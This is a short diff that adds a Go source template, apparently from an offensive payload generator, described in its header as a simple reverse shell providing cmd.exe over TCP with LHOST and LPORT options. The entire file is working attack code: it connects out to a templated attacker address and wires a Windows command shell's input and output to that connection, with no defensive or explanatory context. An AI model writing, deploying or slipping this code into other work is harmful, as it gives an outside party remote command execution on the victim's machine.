@@ -1,0 +1,25 @@
+/*{
+Description: Simple go reverse shell, provides cmd.exe over tcp
+Options:
+LHOST
+LPORT
+}*/
+
+package main
+
+import (
+	"log"
+	"net"
+	"os/exec"
+)
+
+func main() {
+	revcon, err := net.Dial("tcp", "{{.Laddr}}")
+	if err != nil {
+		log.Println(err)
+	}
+	cmdproc := exec.Command("cmd.exe")
+	cmdproc.Stdout = revcon
+	cmdproc.Stdin = revcon
+	cmdproc.Run()
+}
